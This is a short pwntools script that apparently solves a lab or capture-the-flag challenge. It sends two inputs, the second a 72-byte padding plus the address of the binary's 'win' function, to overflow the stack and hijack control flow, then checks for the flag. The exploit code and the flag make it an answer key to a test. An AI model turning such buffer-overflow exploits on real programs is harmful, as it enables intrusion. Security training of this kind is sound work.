from pwn import *
from labs.common.target import start_target

context.arch = "amd64"
elf = ELF("./challenge", checksec=False)
io = start_target("./challenge")
io.recvuntil(b"first:\n")
io.send(b"notes\x00".ljust(32, b"A"))
io.recvuntil(b"second:\n")
io.send(b"B" * 72 + p64(elf.symbols["win"]))
io.shutdown("send")
assert b"flag{split-input}" in io.recvall(timeout=2)
print("flag{split-input}")
